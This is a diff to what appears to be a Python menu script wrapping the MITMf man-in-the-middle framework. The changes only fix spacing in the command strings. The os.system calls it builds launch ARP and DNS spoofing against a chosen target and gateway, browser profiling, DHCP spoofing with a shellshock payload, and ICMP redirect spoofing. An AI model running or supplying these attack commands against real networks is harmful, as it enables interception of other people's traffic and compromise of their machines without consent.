@@ -58,19 +58,19 @@ import os
 while True:
     menuOption=GetMenuSelection()
     if menuOption=="1":
-   	 os.system("mitmf -i "+interface+" --arp --dns --spoof --gateway"+gateway+" --target "+ip)
+   	 os.system("mitmf -i "+interface+" --arp --dns --spoof --gateway "+gateway+" --target "+ip)
    	 break
     elif menuOption=="2":
-   	 os.system("mitmf -i "+interface+" --arp --spoof --gateway"+gateway+" --target "+ip+"--mode rep")
+   	 os.system("mitmf -i "+interface+" --arp --spoof --gateway "+gateway+" --target "+ip+" --mode rep")
    	 break
     elif menuOption=="3":
-   	 os.system("mitmf -i "+interface+" --arp --spoof --gateway"+gateway+" --target "+ip+"--browserprofiler")
+   	 os.system("mitmf -i "+interface+" --arp --spoof --gateway "+gateway+" --target "+ip+" --browserprofiler")
    	 break
     elif menuOption=="4":
    	 os.system("mitmf -i "+interface+" --spoof --dhcp --shellshock")
    	 break
     elif menuOption=="5":
-   	 os.system("mitmf -i "+interface+" --spoof --imcp --gateway"+gateway+" --target "+ip)
+   	 os.system("mitmf -i "+interface+" --spoof --imcp --gateway "+gateway+" --target "+ip)
    	 break
     else:
    	 whileLoopBool=False
